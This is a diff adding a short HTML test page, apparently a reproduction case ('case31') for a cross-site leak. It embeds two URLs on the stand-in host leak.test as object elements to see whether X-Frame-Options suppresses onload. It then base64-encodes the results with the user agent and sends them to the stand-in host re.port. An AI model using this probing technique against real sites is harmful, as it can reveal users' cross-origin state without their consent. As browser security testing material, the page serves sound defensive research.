@@ -1,0 +1,30 @@
+<script>
+    var results = {};
+
+    function run(url, cb) {
+        var iframe = document.createElement("object");
+        document.body.appendChild(iframe);
+        iframe.onload = function () {
+            results[url] = "onload";
+        };
+        iframe.data = url;
+        setTimeout(cb, 2000);
+    }
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case31.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "x-frame-options": results["https://leak.test/custom/case31/main/"],
+            "non-x-frame-options": results["https://leak.test/"],
+            "xsleak_reproduced": results["https://leak.test/custom/case31/main/"] === undefined && results["https://leak.test/"] === "onload"
+        })));
+        xhr.send();
+    }
+
+    window.onload = function () {
+        run("https://leak.test/", function () {
+            run("https://leak.test/custom/case31/main/", report);
+        });
+    }
+</script>
